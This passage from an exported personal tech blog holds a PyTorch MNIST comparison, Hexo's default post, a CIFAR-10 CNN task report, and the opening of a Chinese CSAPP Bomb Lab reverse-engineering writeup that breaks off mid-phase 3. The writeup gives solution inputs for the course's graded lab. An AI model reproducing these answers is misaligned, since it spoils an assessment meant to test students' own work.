class="number">10</span>)</span><br><span class="line">XTrain, YTrain, XValid, YValid, XTest, YTest = <span class="built_in">map</span>(torch.tensor, (XTrain, YTrain, XValid, YValid, XTest, YTest))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">accuracy</span>(<span class="params">batch_z, batch_y</span>):</span></span><br><span class="line">    temp = torch.argmax(batch_z, dim=<span class="number">1</span>)</span><br><span class="line">    r = (temp == batch_y)</span><br><span class="line">    <span class="keyword">return</span> r.<span class="built_in">float</span>().mean()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lambda</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, func</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Lambda, self).__init__()</span><br><span class="line">        self.func = func</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.func(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hyper-parameter</span></span><br><span class="line">bs = <span class="number">64</span></span><br><span class="line">lr = <span class="number">0.1</span></span><br><span class="line">momentum = <span class="number">0.9</span></span><br><span class="line">max_epoch = <span class="number">20</span></span><br><span class="line"><span class="comment"># essential stuff</span></span><br><span class="line">loss_func = F.cross_entropy</span><br><span class="line"><span class="comment"># model = MNIST()</span></span><br><span class="line">model = nn.Sequential(</span><br><span class="line">    Lambda(<span class="keyword">lambda</span> x: x.view(-<span class="number">1</span>, <span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>)),</span><br><span class="line">    nn.Conv2d(<span class="number">1</span>, <span class="number">16</span>, kernel_size=<span class="number">3</span>, stride=<span class="number">2</span>, padding=<span class="number">1</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.Conv2d(<span class="number">16</span>, <span class="number">16</span>, kernel_size=<span class="number">3</span>, stride=<span class="number">2</span>, padding=<span class="number">1</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.Conv2d(<span class="number">16</span>, <span class="number">10</span>, kernel_size=<span class="number">3</span>, stride=<span class="number">2</span>, padding=<span class="number">1</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.AvgPool2d(<span class="number">4</span>),</span><br><span class="line">    Lambda(<span class="keyword">lambda</span> x: x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)),</span><br><span class="line">)</span><br><span class="line"><span class="comment"># <span class="doctag">NOTE:</span> relu is different in these two forms!(F.relu vs nn.ReLU)</span></span><br><span class="line">optimizer = optim.SGD(model.parameters(), lr=lr, momentum=momentum)</span><br><span class="line"><span class="comment"># datasets and dataloaders</span></span><br><span class="line">train_set = TensorDataset(XTrain, YTrain)</span><br><span class="line">train_loader = DataLoader(train_set, batch_size=bs, shuffle=<span class="literal">True</span>)</span><br><span class="line">valid_set = TensorDataset(XValid, YValid)</span><br><span class="line">valid_loader = DataLoader(valid_set, batch_size=bs * <span class="number">2</span>, shuffle=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;training...&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(max_epoch):</span><br><span class="line">        model.train()</span><br><span class="line">        <span class="comment"># training: using training set</span></span><br><span class="line">        <span class="keyword">for</span> batch_x, batch_y <span class="keyword">in</span> train_loader:</span><br><span class="line">            <span class="comment"># forward</span></span><br><span class="line">            batch_z = model(batch_x)</span><br><span class="line">            <span class="comment"># backward</span></span><br><span class="line">            loss = loss_func(batch_z, batch_y)</span><br><span class="line">            loss.backward()</span><br><span class="line">            optimizer.step()</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">        model.<span class="built_in">eval</span>()</span><br><span class="line">        <span class="comment"># inference: using validation set</span></span><br><span class="line">        <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">            valid_loss = <span class="built_in">sum</span>(loss_func(model(batch_x), batch_y) <span class="keyword">for</span> batch_x, batch_y <span class="keyword">in</span> valid_loader) / num_valid</span><br><span class="line">        print(<span class="string">&quot;epoch %d, validation loss=%.4f&quot;</span> % (epoch, valid_loss))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;training done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;testing...&#x27;</span>)</span><br><span class="line">    ZTest = model(XTest)</span><br><span class="line">    print(<span class="string">&#x27;loss=%.4f, accuracy=%.4f&#x27;</span> % (loss_func(ZTest, YTest), accuracy(ZTest, YTest)))</span><br><span class="line">    print(<span class="string">&#x27;testing done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">train()</span><br><span class="line">test()</span><br></pre></td></tr></table></figure></p>
<h2 id="Result-Comparision"><a href="#Result-Comparision" class="headerlink" title="Result Comparision"></a>Result Comparision</h2><h3 id="Linear"><a href="#Linear" class="headerlink" title="Linear"></a>Linear</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">training...</span><br><span class="line">epoch 0, validation loss&#x3D;0.0032</span><br><span class="line">epoch 1, validation loss&#x3D;0.0028</span><br><span class="line">epoch 2, validation loss&#x3D;0.0026</span><br><span class="line">epoch 3, validation loss&#x3D;0.0025</span><br><span class="line">epoch 4, validation loss&#x3D;0.0024</span><br><span class="line">epoch 5, validation loss&#x3D;0.0024</span><br><span class="line">epoch 6, validation loss&#x3D;0.0023</span><br><span class="line">epoch 7, validation loss&#x3D;0.0023</span><br><span class="line">epoch 8, validation loss&#x3D;0.0023</span><br><span class="line">epoch 9, validation loss&#x3D;0.0022</span><br><span class="line">epoch 10, validation loss&#x3D;0.0022</span><br><span class="line">epoch 11, validation loss&#x3D;0.0022</span><br><span class="line">epoch 12, validation loss&#x3D;0.0022</span><br><span class="line">epoch 13, validation loss&#x3D;0.0022</span><br><span class="line">epoch 14, validation loss&#x3D;0.0022</span><br><span class="line">epoch 15, validation loss&#x3D;0.0022</span><br><span class="line">epoch 16, validation loss&#x3D;0.0022</span><br><span class="line">epoch 17, validation loss&#x3D;0.0021</span><br><span class="line">epoch 18, validation loss&#x3D;0.0022</span><br><span class="line">epoch 19, validation loss&#x3D;0.0021</span><br><span class="line">training done.</span><br><span class="line">testing...</span><br><span class="line">loss&#x3D;0.2707, accuracy&#x3D;0.9251</span><br><span class="line">testing done.</span><br></pre></td></tr></table></figure>
<h3 id="CNN"><a href="#CNN" class="headerlink" title="CNN"></a>CNN</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">training...</span><br><span class="line">epoch 0, validation loss&#x3D;0.0042</span><br><span class="line">epoch 1, validation loss&#x3D;0.0020</span><br><span class="line">epoch 2, validation loss&#x3D;0.0018</span><br><span class="line">epoch 3, validation loss&#x3D;0.0017</span><br><span class="line">epoch 4, validation loss&#x3D;0.0015</span><br><span class="line">epoch 5, validation loss&#x3D;0.0012</span><br><span class="line">epoch 6, validation loss&#x3D;0.0015</span><br><span class="line">epoch 7, validation loss&#x3D;0.0013</span><br><span class="line">epoch 8, validation loss&#x3D;0.0012</span><br><span class="line">epoch 9, validation loss&#x3D;0.0011</span><br><span class="line">epoch 10, validation loss&#x3D;0.0011</span><br><span class="line">epoch 11, validation loss&#x3D;0.0012</span><br><span class="line">epoch 12, validation loss&#x3D;0.0011</span><br><span class="line">epoch 13, validation loss&#x3D;0.0013</span><br><span class="line">epoch 14, validation loss&#x3D;0.0010</span><br><span class="line">epoch 15, validation loss&#x3D;0.0010</span><br><span class="line">epoch 16, validation loss&#x3D;0.0010</span><br><span class="line">epoch 17, validation loss&#x3D;0.0010</span><br><span class="line">epoch 18, validation loss&#x3D;0.0010</span><br><span class="line">epoch 19, validation loss&#x3D;0.0009</span><br><span class="line">training done.</span><br><span class="line">testing...</span><br><span class="line">loss&#x3D;0.1135, accuracy&#x3D;0.9666</span><br><span class="line">testing done.</span><br></pre></td></tr></table></figure>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Life is short, I use PyTorch.</p>
<p>CNN, yyds!</p>
]]></content>
      <tags>
        <tag>Deep-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/12/19/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>NNI Student Program 2020-Task2</title>
    <url>/2021/01/08/NNI-Student-Program-2020-Task2/</url>
    <content><![CDATA[<h1 id="Task2-进阶任务-HPO-NAS"><a href="#Task2-进阶任务-HPO-NAS" class="headerlink" title="Task2 进阶任务 HPO+NAS"></a>Task2 进阶任务 HPO+NAS</h1><h2 id="Task-2-1"><a href="#Task-2-1" class="headerlink" title="Task 2.1"></a>Task 2.1</h2><h3 id="CIFAR10简介"><a href="#CIFAR10简介" class="headerlink" title="CIFAR10简介"></a>CIFAR10简介</h3><p>CIFAR10数据集共有60000张分辨率为32*32的彩色图像，分为十类，每类都有6000张图像。</p>
<p>50000张图像构成训练集，10000张图像构成测试集。</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/NNI-Student-Program-2020-Task2/1.png">

<h3 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h3><p>我们使用PyTorch编写卷积神经网络来解决这项图像分类任务。</p>
<p>大体流程如下：</p>
<ol>
<li>使用torchvision下载数据集，读取数据集</li>
<li>定义解决该问题的卷积神经网络</li>
<li>训练神经网络</li>
<li>测试神经网络</li>
</ol>
<p>代码中的神经网络有两个卷积层：</p>
<ol>
<li>第一层，3个输入（RGB），6个输出。</li>
<li>第二层，6个输入，16个输出。</li>
</ol>
<p>池化层通过<code>torch.nn.MaxPool2d</code>来创建。</p>
<p>然后定义三个全连接函数：</p>
<ol>
<li>第一个，将16*5*5个节点连接至120个节点。</li>
<li>第二个，将120个节点连接到84个节点。</li>
<li>第三个，将84个节点连接到10个节点，即对应分类。</li>
</ol>
<p>激活函数全程使用Relu函数。</p>
<p>误差函数使用交叉熵函数，优化方法使用SGD。</p>
<h3 id="实验配置"><a href="#实验配置" class="headerlink" title="实验配置"></a>实验配置</h3><p>使用Anaconda环境下的Python3.8，使用PyCharm运行程序。</p>
<p>设置程序不使用GPU，只用CPU完成训练。</p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>我们利用了<code>torch.nn</code>模块定义了本任务的神经网络。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NeuralNet</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(NeuralNet, self).__init__()</span><br><span class="line">        self.conv1 = nn.Conv2d(<span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>)</span><br><span class="line">        self.pool = nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="number">6</span>, <span class="number">16</span>, <span class="number">5</span>)</span><br><span class="line">        self.func1 = nn.Linear(<span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>, <span class="number">120</span>)</span><br><span class="line">        self.func2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.func3 = nn.Linear(<span class="number">84</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = self.pool(F.relu(self.conv1(x)))</span><br><span class="line">        x = self.pool(F.relu(self.conv2(x)))</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>) <span class="comment"># -1 means uncertain number</span></span><br><span class="line">        x = F.relu(self.func1(x))</span><br><span class="line">        x = F.relu(self.func2(x))</span><br><span class="line">        x = self.func3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>而训练过程中，使用PyTorch的写法是这样的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>(<span class="params">trainloader, path</span>):</span></span><br><span class="line">    neuralnet = NeuralNet()</span><br><span class="line">    criterion = nn.CrossEntropyLoss()</span><br><span class="line">    optimizer = optim.SGD(neuralnet.parameters(), lr=<span class="number">0.001</span>, momentum=<span class="number">0.9</span>)</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        running_loss = <span class="number">0.0</span></span><br><span class="line">        <span class="keyword">for</span> i, data <span class="keyword">in</span> <span class="built_in">enumerate</span>(trainloader, <span class="number">0</span>):</span><br><span class="line">            inputs, labels = data</span><br><span class="line">            <span class="comment"># training template for PyTorch</span></span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            outputs = neuralnet(inputs)</span><br><span class="line">            loss = criterion(outputs, labels)</span><br><span class="line">            loss.backward()</span><br><span class="line">            optimizer.step()</span><br><span class="line"></span><br><span class="line">            running_loss += loss.item()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">2000</span> == <span class="number">1999</span>:</span><br><span class="line">                print(<span class="string">&#x27;[%5d, %5d] loss = %.5f&#x27;</span> % (epoch + <span class="number">1</span>, i + <span class="number">1</span>, running_loss / <span class="number">2000</span>))</span><br><span class="line">                running_loss = <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">    torch.save(neuralnet.state_dict(), path)</span><br><span class="line">    print(<span class="string">&#x27;Training Finished&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h3><p>经10个epoch的训练，最终输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\12058\anaconda3\python.exe C:&#x2F;Users&#x2F;12058&#x2F;Documents&#x2F;GitHub&#x2F;nni-learning&#x2F;task2&#x2F;2.1&#x2F;main.py</span><br><span class="line">[    1,  2000] loss &#x3D; 2.16590</span><br><span class="line">[    1,  4000] loss &#x3D; 1.82480</span><br><span class="line">[    1,  6000] loss &#x3D; 1.64638</span><br><span class="line">[    1,  8000] loss &#x3D; 1.56156</span><br><span class="line">[    1, 10000] loss &#x3D; 1.49378</span><br><span class="line">[    1, 12000] loss &#x3D; 1.46539</span><br><span class="line">[    2,  2000] loss &#x3D; 1.39108</span><br><span class="line">[    2,  4000] loss &#x3D; 1.38308</span><br><span class="line">[    2,  6000] loss &#x3D; 1.36254</span><br><span class="line">[    2,  8000] loss &#x3D; 1.30314</span><br><span class="line">[    2, 10000] loss &#x3D; 1.30563</span><br><span class="line">[    2, 12000] loss &#x3D; 1.26935</span><br><span class="line">[    3,  2000] loss &#x3D; 1.21411</span><br><span class="line">[    3,  4000] loss &#x3D; 1.21809</span><br><span class="line">[    3,  6000] loss &#x3D; 1.17786</span><br><span class="line">[    3,  8000] loss &#x3D; 1.18651</span><br><span class="line">[    3, 10000] loss &#x3D; 1.16956</span><br><span class="line">[    3, 12000] loss &#x3D; 1.16728</span><br><span class="line">[    4,  2000] loss &#x3D; 1.10504</span><br><span class="line">[    4,  4000] loss &#x3D; 1.11141</span><br><span class="line">[    4,  6000] loss &#x3D; 1.07836</span><br><span class="line">[    4,  8000] loss &#x3D; 1.10194</span><br><span class="line">[    4, 10000] loss &#x3D; 1.07333</span><br><span class="line">[    4, 12000] loss &#x3D; 1.06928</span><br><span class="line">[    5,  2000] loss &#x3D; 0.98897</span><br><span class="line">[    5,  4000] loss &#x3D; 1.01186</span><br><span class="line">[    5,  6000] loss &#x3D; 1.01296</span><br><span class="line">[    5,  8000] loss &#x3D; 1.01628</span><br><span class="line">[    5, 10000] loss &#x3D; 1.02610</span><br><span class="line">[    5, 12000] loss &#x3D; 1.03693</span><br><span class="line">[    6,  2000] loss &#x3D; 0.94843</span><br><span class="line">[    6,  4000] loss &#x3D; 0.94470</span><br><span class="line">[    6,  6000] loss &#x3D; 0.96298</span><br><span class="line">[    6,  8000] loss &#x3D; 0.96035</span><br><span class="line">[    6, 10000] loss &#x3D; 0.98843</span><br><span class="line">[    6, 12000] loss &#x3D; 0.96657</span><br><span class="line">[    7,  2000] loss &#x3D; 0.87795</span><br><span class="line">[    7,  4000] loss &#x3D; 0.90013</span><br><span class="line">[    7,  6000] loss &#x3D; 0.91402</span><br><span class="line">[    7,  8000] loss &#x3D; 0.94256</span><br><span class="line">[    7, 10000] loss &#x3D; 0.93912</span><br><span class="line">[    7, 12000] loss &#x3D; 0.91624</span><br><span class="line">[    8,  2000] loss &#x3D; 0.84444</span><br><span class="line">[    8,  4000] loss &#x3D; 0.85796</span><br><span class="line">[    8,  6000] loss &#x3D; 0.90461</span><br><span class="line">[    8,  8000] loss &#x3D; 0.89855</span><br><span class="line">[    8, 10000] loss &#x3D; 0.89341</span><br><span class="line">[    8, 12000] loss &#x3D; 0.89116</span><br><span class="line">[    9,  2000] loss &#x3D; 0.79060</span><br><span class="line">[    9,  4000] loss &#x3D; 0.83296</span><br><span class="line">[    9,  6000] loss &#x3D; 0.84468</span><br><span class="line">[    9,  8000] loss &#x3D; 0.85216</span><br><span class="line">[    9, 10000] loss &#x3D; 0.86738</span><br><span class="line">[    9, 12000] loss &#x3D; 0.87915</span><br><span class="line">[   10,  2000] loss &#x3D; 0.76653</span><br><span class="line">[   10,  4000] loss &#x3D; 0.80672</span><br><span class="line">[   10,  6000] loss &#x3D; 0.82791</span><br><span class="line">[   10,  8000] loss &#x3D; 0.80691</span><br><span class="line">[   10, 10000] loss &#x3D; 0.83649</span><br><span class="line">[   10, 12000] loss &#x3D; 0.84138</span><br><span class="line">Training Finished</span><br><span class="line">Accuracy of plane: 81.14%</span><br><span class="line">Accuracy of car: 92.10%</span><br><span class="line">Accuracy of bird: 74.58%</span><br><span class="line">Accuracy of cat: 47.94%</span><br><span class="line">Accuracy of deer: 65.08%</span><br><span class="line">Accuracy of dog: 61.28%</span><br><span class="line">Accuracy of frog: 71.88%</span><br><span class="line">Accuracy of horse: 73.24%</span><br><span class="line">Accuracy of ship: 86.18%</span><br><span class="line">Accuracy of truck: 66.52%</span><br><span class="line">Testing Finished</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看出，损失值总体稳定下降，对车、飞机、船等图像分类准确率较高，而对猫、狗、卡车等图像的准确率较不理想。</p>
<p>如何提高部分不理想的分类准确率？请看Task 2.2……</p>
<h2 id="Task-2-2"><a href="#Task-2-2" class="headerlink" title="Task 2.2"></a>Task 2.2</h2><p>to be continued…</p>
]]></content>
      <tags>
        <tag>NNI</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP Bomb Lab Writeup</title>
    <url>/2021/01/13/CSAPP-Bomb-Lab-Writeup/</url>
    <content><![CDATA[<p>这是CSAPP的bomblab，对打pwn的新手补补基础还是非常有用的，尤其是各种汇编操作和IDA Pro里各种各样的奇妙语法，更是让我这个菜鸡大开眼界（还能这么坑……）</p>
<p>前五关非常的常规，我们通过汇编跟反汇编都看一下。</p>
<p>第六关我不行了，就通过反汇编的C代码走一走。</p>
<p>做了一个晚上加半个早上，终于搞定了，是我太菜……</p>
<h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase 1"></a>phase 1</h2><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi</span><br><span class="line">  400ee9:	e8 4a 04 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:	85 c0                	test   %eax,%eax</span><br><span class="line">  400ef0:	74 05                	je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:	e8 43 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  400efb:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>其中0x402400这个地址很奇妙，我们用gdb跟进去看一看：</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase1.png">
<p>这里的<code>test</code>跟<code>je</code>两个汇编语句是连接在一起的，一般就像是这样用的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test %rax, %rax</span><br><span class="line">je 0x??????</span><br></pre></td></tr></table></figure>
<p><code>test</code>语句本质就是一个<code>and</code>，不过用<code>test</code>的话不会去改变%rax的值，而会直接放到下面来进行比较。</p>
<p>这两句汇编的意思就是%rax值等于0时就跳转，否则不跳转，执行下一条命令。</p>
<p>就是比较字符串相等就可以进入下一步了。</p>
<p>所以只需要保证输入的字符串是<code>&quot;Border relations with Canada have never been better.&quot;</code>，就可以了。</p>
<h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase1(IDA).png">
<p>用IDA的话一眼看出来，就不用分析了。</p>
<h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase 2"></a>phase 2</h2><h3 id="汇编-1"><a href="#汇编-1" class="headerlink" title="汇编"></a>汇编</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:	55                   	push   %rbp</span><br><span class="line">  400efd:	53                   	push   %rbx</span><br><span class="line">  400efe:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  400f02:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  400f05:	e8 52 05 00 00       	callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)</span><br><span class="line">  400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:	e8 25 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax</span><br><span class="line">  400f1a:	01 c0                	add    %eax,%eax</span><br><span class="line">  400f1c:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">  400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">  400f20:	e8 15 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:	48 83 c3 04          	add    $0x4,%rbx</span><br><span class="line">  400f29:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx</span><br><span class="line">  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp</span><br><span class="line">  400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  400f40:	5b                   	pop    %rbx</span><br><span class="line">  400f41:	5d                   	pop    %rbp</span><br><span class="line">  400f42:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>按照汇编来分析，stack frame的构造如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00(rsp)</span><br><span class="line">0x04(rbp)</span><br><span class="line">0x08      rbp</span><br><span class="line">0x1c          [5]</span><br><span class="line">0x10          [4]</span><br><span class="line">0x14          [3]</span><br><span class="line">0x18          [2]</span><br><span class="line">0x1c          [1] &lt;- rbx</span><br><span class="line">0x20 rsp  rsi [0] &lt;- rax</span><br></pre></td></tr></table></figure>
<p>在从<code>rsp - 0x20</code>到<code>rsp - 0x08</code>遍历的过程中，rax永远在栈上比rbx的地址小个4，也就是一个<code>int</code>的位置。每次check之后依次往后移一位。</p>
<p>我们需要满足的是两倍的rax等于rbx，也就是我们输入的数列是成倍增长的。</p>
<p>还有一个条件：读入到<code>rsp - 0x20</code>，也就是第一个数字，必须是1。</p>
<p>所以最终的输入就是<code>1 2 4 8 16 32</code>。</p>
<h3 id="IDA-1"><a href="#IDA-1" class="headerlink" title="IDA"></a>IDA</h3><img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase2(IDA).png">
<p>输入六个整数，需要符合里面的这个规则：<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">2</span> * *((_DWORD *)v2 - <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)v2 != (_DWORD)result )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  v2 += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(v2 != v5);</span><br></pre></td></tr></table></figure><br>这里需要注意：在第三行的代码里，<code>v2</code>先被强制类型转换为<code>DWORD*</code>，然后再执行减1的操作。</p>
<p>因为<code>v2</code>的指针类型在减1之前已经确定，所以实际上<code>*((_DWORD *)v2 - 1)</code>就相当于<code>*(_DWORD *)(v2 - 4)</code>，也就是数组里面的上一个元素。</p>
<p>所以六个整数，只需要满足后一个是前一个的两倍，就可以了。</p>
<h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase 3"></a>phase 3</h2><h3 id="IDA-2"><a href="#IDA-2" class="headerlink" title="IDA"></a>IDA</h3><p>非常简单，switch里面提供了8个配套选择，任选一个即可过关。</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase3(IDA).png">
<h3 id="汇编-2"><a href="#汇编-2" class="headerlink" title="汇编"></a>汇编</h3><p>然而这个关卡的话看汇编会比较难看出来。这也是这一关的价值所在。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax</span><br><span class="line">  400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)</span><br><span class="line">  400f6f:	77 3c                	ja     400fad &lt;phase_3+0x6a&gt;</span><br><span class="line">  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax</span><br><span class="line">  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)</span><br><span class="line">  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax</span><br><span class="line">  400f81:	eb 3b                	jmp    